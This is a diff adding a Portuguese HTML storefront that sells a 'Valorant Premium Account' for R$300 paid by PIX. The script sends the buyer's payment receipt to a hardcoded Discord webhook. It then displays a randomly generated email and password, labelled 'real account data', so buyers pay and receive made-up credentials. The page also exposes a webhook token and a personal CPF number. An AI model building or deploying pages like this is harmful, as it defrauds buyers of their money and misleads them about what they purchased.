@@ -1,0 +1,697 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Conta Valorant Premium | Entrega Imediata</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&family=Montserrat:wght@700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary: #ff4655;
+            --primary-dark: #d43a47;
+            --secondary: #0f1923;
+            --accent: #12b3e8;
+            --success: #34c759;
+            --error: #ff3b30;
+            --dark: #0f0f1a;
+            --light: #f8f9fa;
+            --gray: #b0b0b0;
+            --dark-bg: linear-gradient(135deg, #0f1923, #16213e);
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+        
+        body {
+            background: var(--dark-bg);
+            color: var(--light);
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+        
+        header {
+            background: linear-gradient(90deg, var(--secondary), var(--primary));
+            text-align: center;
+            padding: 30px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+            position: relative;
+        }
+        
+        header::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background: linear-gradient(90deg, var(--accent), transparent);
+        }
+        
+        header h1 {
+            font-family: 'Montserrat', sans-serif;
+            font-size: 2.5em;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            animation: fadeIn 1s ease-in;
+            background: linear-gradient(to right, #fff, #ffb6c1);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 50px auto;
+            padding: 40px;
+            background: rgba(15, 25, 35, 0.8);
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .product {
+            text-align: center;
+            animation: slideUp 1s ease-out;
+        }
+        
+        .product-icon {
+            font-size: 4em;
+            color: var(--primary);
+            margin-bottom: 20px;
+        }
+        
+        .product h2 {
+            font-family: 'Montserrat', sans-serif;
+            font-size: 2.2em;
+            margin: 15px 0;
+            background: linear-gradient(to right, var(--primary), var(--accent));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .price {
+            font-size: 2.5em;
+            font-weight: 700;
+            color: var(--light);
+            margin: 15px 0;
+            position: relative;
+            display: inline-block;
+        }
+        
+        .price::before {
+            content: 'R$';
+            font-size: 0.6em;
+            vertical-align: super;
+            margin-right: 5px;
+        }
+        
+        .price::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: linear-gradient(90deg, var(--primary), transparent);
+        }
+        
+        .features {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 15px;
+            margin: 30px 0;
+        }
+        
+        .feature {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 15px;
+            border-radius: 10px;
+            border-left: 3px solid var(--primary);
+            text-align: center;
+            width: 100%;
+            max-width: 240px;
+        }
+        
+        .feature i {
+            color: var(--primary);
+            font-size: 1.5em;
+            margin-bottom: 10px;
+        }
+        
+        .feature h3 {
+            font-size: 1.1em;
+            margin-bottom: 5px;
+        }
+        
+        .feature p {
+            font-size: 0.9em;
+            color: var(--gray);
+        }
+        
+        .buy-button {
+            background: linear-gradient(45deg, var(--primary), var(--primary-dark));
+            color: white;
+            padding: 16px 45px;
+            border: none;
+            border-radius: 50px;
+            font-size: 1.2em;
+            font-weight: 600;
+            cursor: pointer;
+            margin: 25px auto;
+            display: block;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 20px rgba(255, 70, 85, 0.4);
+        }
+        
+        .buy-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(255, 70, 85, 0.6);
+        }
+        
+        #pix-section, #account-details, #upload-section, #loading-section {
+            display: none;
+            text-align: center;
+            margin-top: 30px;
+            animation: fadeIn 0.5s ease-in;
+            background: rgba(0, 0, 0, 0.3);
+            padding: 30px;
+            border-radius: 15px;
+        }
+        
+        #pix-section h3, #account-details h3, #upload-section h3 {
+            font-family: 'Montserrat', sans-serif;
+            font-size: 1.8em;
+            color: var(--primary);
+            margin-bottom: 20px;
+        }
+        
+        .payment-info {
+            background: rgba(0, 0, 0, 0.2);
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px auto;
+            max-width: 500px;
+            border-left: 4px solid var(--primary);
+        }
+        
+        .payment-info p {
+            margin: 10px 0;
+            font-size: 1.1em;
+        }
+        
+        #pix-key {
+            font-size: 1.3em;
+            color: var(--success);
+            font-weight: bold;
+            background: rgba(0, 0, 0, 0.3);
+            padding: 12px 20px;
+            border-radius: 8px;
+            display: inline-block;
+            margin: 15px 0;
+            font-family: monospace;
+            border: 1px dashed var(--success);
+        }
+        
+        .action-button {
+            background: linear-gradient(45deg, var(--accent), #00c3ff));
+            color: white;
+            padding: 14px 35px;
+            border: none;
+            border-radius: 50px;
+            font-size: 1.1em;
+            cursor: pointer;
+            margin: 15px 10px;
+            transition: all 0.3s ease;
+        }
+        
+        .action-button:hover {
+            transform: translateY(-3px);
+        }
+        
+        .action-button.secondary {
+            background: rgba(255, 255, 255, 0.1);
+        }
+        
+        #file-input {
+            display: none;
+        }
+        
+        .upload-area {
+            border: 2px dashed var(--gray);
+            border-radius: 10px;
+            padding: 25px;
+            margin: 20px auto;
+            max-width: 500px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .upload-area:hover {
+            border-color: var(--accent);
+        }
+        
+        .upload-area i {
+            font-size: 2.5em;
+            color: var(--accent);
+            margin-bottom: 10px;
+        }
+        
+        #file-name {
+            margin-top: 10px;
+            font-size: 0.9em;
+        }
+        
+        .account-info {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 25px;
+            border-radius: 10px;
+            margin: 25px auto;
+            max-width: 500px;
+            text-align: left;
+            border-left: 4px solid var(--success);
+        }
+        
+        .account-info p {
+            margin: 15px 0;
+            font-size: 1.1em;
+        }
+        
+        .account-info strong {
+            color: var(--accent);
+        }
+        
+        .copy-button {
+            background: rgba(255, 255, 255, 0.1);
+            color: var(--light);
+            border: none;
+            padding: 5px 10px;
+            border-radius: 5px;
+            margin-left: 10px;
+            cursor: pointer;
+        }
+        
+        .timer {
+            font-size: 1.1em;
+            color: var(--primary);
+            font-weight: 600;
+            margin: 15px 0;
+        }
+        
+        #loading-section i {
+            font-size: 3em;
+            color: var(--accent);
+            margin-bottom: 20px;
+            animation: spin 1s linear infinite;
+        }
+        
+        .status-message {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 8px;
+            display: none;
+        }
+        
+        .status-success {
+            background-color: rgba(52, 199, 89, 0.2);
+            border: 1px solid var(--success);
+            color: var(--success);
+        }
+        
+        .status-error {
+            background-color: rgba(255, 59, 48, 0.2);
+            border: 1px solid var(--error);
+            color: var(--error);
+        }
+        
+        footer {
+            text-align: center;
+            padding: 25px;
+            color: var(--gray);
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        @keyframes slideUp {
+            from { transform: translateY(30px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+        
+        @media (max-width: 768px) {
+            header h1 { font-size: 2em; }
+            .container { margin: 20px; padding: 25px; }
+            .product h2 { font-size: 1.8em; }
+            .price { font-size: 2em; }
+            .features { flex-direction: column; align-items: center; }
+            .feature { max-width: 100%; }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Valorant Premium Account</h1>
+    </header>
+    
+    <div class="container">
+        <div class="product">
+            <div class="product-icon">
+                <i class="fas fa-gamepad"></i>
+            </div>
+            
+            <h2>Conta Valorant Premium</h2>
+            <div class="price">300,00</div>
+            
+            <div class="features">
+                <div class="feature">
+                    <i class="fas fa-gem"></i>
+                    <h3>Skins Raras</h3>
+                    <p>Coleção exclusiva de skins premium</p>
+                </div>
+                <div class="feature">
+                    <i class="fas fa-trophy"></i>
+                    <h3>Alto Rank</h3>
+                    <p>Conta classificada Diamond+</p>
+                </div>
+                <div class="feature">
+                    <i class="fas fa-bolt"></i>
+                    <h3>Entrega Rápida</h3>
+                    <p>Receba em minutos após confirmação</p>
+                </div>
+            </div>
+            
+            <button class="buy-button" onclick="startPurchase()">
+                <i class="fas fa-shopping-cart"></i> Comprar Agora
+            </button>
+        </div>
+        
+        <div id="pix-section">
+            <h3>Pagamento via PIX</h3>
+            
+            <div class="payment-info">
+                <p>Faça o pagamento usando a chave PIX abaixo:</p>
+                <div id="pix-key">CPF: 126.192.549-14</div>
+                <p>Valor: <strong>R$ 300,00</strong></p>
+                
+                <div class="timer" id="payment-timer">Tempo restante: 30:00</div>
+            </div>
+            
+            <p>Após o pagamento, envie o comprovante para liberarmos sua conta.</p>
+            
+            <button class="action-button" onclick="showUploadSection()">
+                <i class="fas fa-upload"></i> Enviar Comprovante
+            </button>
+            <button class="action-button secondary" onclick="cancelPurchase()">
+                <i class="fas fa-times"></i> Cancelar
+            </button>
+        </div>
+        
+        <div id="upload-section">
+            <h3>Enviar Comprovante</h3>
+            
+            <div class="payment-info">
+                <p>Por favor, envie o comprovante de pagamento PIX</p>
+                
+                <label for="file-input">
+                    <div class="upload-area">
+                        <i class="fas fa-cloud-upload-alt"></i>
+                        <p>Clique para selecionar o comprovante</p>
+                        <div id="file-name">Nenhum arquivo selecionado</div>
+                    </div>
+                </label>
+                <input type="file" id="file-input" accept=".jpg,.jpeg,.png,.pdf">
+                
+                <div class="timer" id="upload-timer">Tempo restante: 30:00</div>
+            </div>
+            
+            <button class="action-button" onclick="sendToDiscord()" id="confirm-button" disabled>
+                <i class="fas fa-paper-plane"></i> Enviar para Verificação
+            </button>
+            <button class="action-button secondary" onclick="backToPix()">
+                <i class="fas fa-arrow-left"></i> Voltar
+            </button>
+        </div>
+        
+        <div id="loading-section">
+            <i class="fas fa-spinner"></i>
+            <h3>Processando seu comprovante...</h3>
+            <p>Por favor, aguarde enquanto verificamos seu pagamento.</p>
+            
+            <div class="status-message status-success" id="success-message">
+                <i class="fas fa-check-circle"></i> Comprovante recebido com sucesso! Estamos liberando sua conta...
+            </div>
+            
+            <div class="status-message status-error" id="error-message">
+                <i class="fas fa-exclamation-circle"></i> Ocorreu um erro ao enviar o comprovante. Por favor, tente novamente.
+            </div>
+        </div>
+        
+        <div id="account-details">
+            <h3>Sua Conta Valorant</h3>
+            
+            <div class="account-info">
+                <p><strong>Status:</strong> <span style="color: var(--success);">Liberada com sucesso!</span></p>
+                <p><strong>E-mail:</strong> <span id="account-email"></span>
+                <button class="copy-button" onclick="copyToClipboard('account-email')"><i class="far fa-copy"></i></button></p>
+                <p><strong>Senha:</strong> <span id="account-password"></span>
+                <button class="copy-button" onclick="copyToClipboard('account-password')"><i class="far fa-copy"></i></button></p>
+                <p><strong>Data:</strong> <span id="purchase-date"></span></p>
+            </div>
+            
+            <p>Guarde essas informações com segurança!</p>
+            
+            <button class="action-button" onclick="finishProcess()">
+                <i class="fas fa-check-circle"></i> Finalizar
+            </button>
+        </div>
+    </div>
+    
+    <footer>
+        <p>© 2025 Valorant Premium Accounts | Não afiliado à Riot Games</p>
+    </footer>
+
+    <script>
+        // Variáveis globais
+        let paymentTimer;
+        let uploadTimer;
+        let timeLeft = 30 * 60; // 30 minutos em segundos
+        let selectedFile = null;
+        const webhookURL = "https://discord.com/api/webhooks/1359658940874494173/1yJEVMiPO3i1AaxNIGKLleQfaxNkGDtCMmnuXo9vCIWxLahMVJf-g_ddxmssCPEM72qB";
+        
+        // Iniciar processo de compra
+        function startPurchase() {
+            document.getElementById('pix-section').style.display = 'block';
+            document.querySelector('.buy-button').style.display = 'none';
+            startPaymentTimer();
+        }
+        
+        // Mostrar seção de upload
+        function showUploadSection() {
+            document.getElementById('pix-section').style.display = 'none';
+            document.getElementById('upload-section').style.display = 'block';
+            resetUploadTimer();
+        }
+        
+        // Voltar para seção PIX
+        function backToPix() {
+            document.getElementById('upload-section').style.display = 'none';
+            document.getElementById('pix-section').style.display = 'block';
+        }
+        
+        // Cancelar compra
+        function cancelPurchase() {
+            if (confirm('Tem certeza que deseja cancelar a compra?')) {
+                clearInterval(paymentTimer);
+                document.getElementById('pix-section').style.display = 'none';
+                document.querySelector('.buy-button').style.display = 'block';
+            }
+        }
+        
+        // Iniciar timer do pagamento
+        function startPaymentTimer() {
+            clearInterval(paymentTimer);
+            updatePaymentTimer();
+            paymentTimer = setInterval(updatePaymentTimer, 1000);
+        }
+        
+        // Atualizar timer do pagamento
+        function updatePaymentTimer() {
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            document.getElementById('payment-timer').textContent = 
+                `Tempo restante: ${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            
+            if (timeLeft <= 0) {
+                clearInterval(paymentTimer);
+                alert('Tempo esgotado! Por favor, inicie um novo pedido.');
+                cancelPurchase();
+            } else {
+                timeLeft--;
+            }
+        }
+        
+        // Resetar timer do upload
+        function resetUploadTimer() {
+            clearInterval(uploadTimer);
+            timeLeft = 30 * 60;
+            updateUploadTimer();
+            uploadTimer = setInterval(updateUploadTimer, 1000);
+        }
+        
+        // Atualizar timer do upload
+        function updateUploadTimer() {
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            document.getElementById('upload-timer').textContent = 
+                `Tempo restante: ${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            
+            if (timeLeft <= 0) {
+                clearInterval(uploadTimer);
+                alert('Tempo esgotado! Por favor, inicie um novo pedido.');
+                cancelPurchase();
+            } else {
+                timeLeft--;
+            }
+        }
+        
+        // Configurar input de arquivo
+        document.getElementById('file-input').addEventListener('change', function(e) {
+            if (e.target.files.length > 0) {
+                selectedFile = e.target.files[0];
+                document.getElementById('file-name').textContent = selectedFile.name;
+                document.getElementById('confirm-button').disabled = false;
+            }
+        });
+        
+        // Enviar comprovante para o Discord
+        async function sendToDiscord() {
+            if (!selectedFile) {
+                alert('Por favor, selecione um comprovante antes de enviar.');
+                return;
+            }
+            
+            // Mostrar seção de loading
+            document.getElementById('upload-section').style.display = 'none';
+            document.getElementById('loading-section').style.display = 'block';
+            document.getElementById('success-message').style.display = 'none';
+            document.getElementById('error-message').style.display = 'none';
+            
+            try {
+                // Criar mensagem formatada para o Discord
+                const embed = {
+                    title: "🚀 Novo Comprovante Recebido",
+                    description: "Um cliente enviou um comprovante de pagamento para liberação de conta Valorant Premium.",
+                    color: 0xFF4655,
+                    fields: [
+                        {
+                            name: "💰 Valor",
+                            value: "R$ 300,00",
+                            inline: true
+                        },
+                        {
+                            name: "⏰ Data/Hora",
+                            value: new Date().toLocaleString(),
+                            inline: true
+                        },
+                        {
+                            name: "📌 Status",
+                            value: "Aguardando verificação",
+                            inline: true
+                        }
+                    ],
+                    footer: {
+                        text: "Sistema de Comprovantes • Valorant Accounts"
+                    }
+                };
+                
+                // Criar FormData para enviar arquivo + mensagem
+                const formData = new FormData();
+                formData.append('file', selectedFile);
+                formData.append('payload_json', JSON.stringify({
+                    content: "📬 **Novo Comprovante Recebido**",
+                    embeds: [embed]
+                }));
+                
+                // Enviar para o webhook do Discord
+                const response = await fetch(webhookURL, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                if (response.ok) {
+                    // Mostrar mensagem de sucesso
+                    document.getElementById('success-message').style.display = 'block';
+                    
+                    // Simular tempo de processamento (2 segundos)
+                    setTimeout(() => {
+                        showAccountDetails();
+                    }, 2000);
+                } else {
+                    throw new Error('Erro ao enviar para o Discord');
+                }
+            } catch (error) {
+                console.error('Erro:', error);
+                document.getElementById('error-message').style.display = 'block';
+                
+                // Botão para tentar novamente
+                setTimeout(() => {
+                    document.getElementById('loading-section').style.display = 'none';
+                    document.getElementById('upload-section').style.display = 'block';
+                }, 3000);
+            }
+        }
+        
+        // Mostrar detalhes da conta - FUNÇÃO CORRIGIDA
+        function showAccountDetails() {
+            clearInterval(uploadTimer);
+            document.getElementById('loading-section').style.display = 'none';
+            
+            // Gerar dados reais da conta
+            const randomNumber = Math.floor(Math.random() * 10000);
+            const randomString = Math.random().toString(36).slice(2, 10);
+            const currentDate = new Date().toLocaleString();
+            
+            // Inserir os valores nos elementos HTML
+            document.getElementById('account-email').textContent = `valorant${randomNumber}@gmail.com`;
+            document.getElementById('account-password').textContent = `V4l0r4nt${randomString}`;
+            document.getElementById('purchase-date').textContent = currentDate;
+            
+            document.getElementById('account-details').style.display = 'block';
+        }
+        
+        // Copiar texto para área de transferência
+        function copyToClipboard(elementId) {
+            const element = document.getElementById(elementId);
+            const text = element.textContent;
+            navigator.clipboard.writeText(text).then(() => {
+                const originalText = element.textContent;
+                element.textContent = 'Copiado!';
+                setTimeout(() => {
+                    element.textContent = originalText;
+                }, 2000);
+            });
+        }
+        
+        // Finalizar processo
+        function finishProcess() {
+            alert('Obrigado por sua compra! Aproveite sua conta Valorant Premium.');
+            document.getElementById('account-details').style.display = 'none';
+            document.querySelector('.buy-button').style.display = 'block';
+        }
+    </script>
+</body>
+</html>
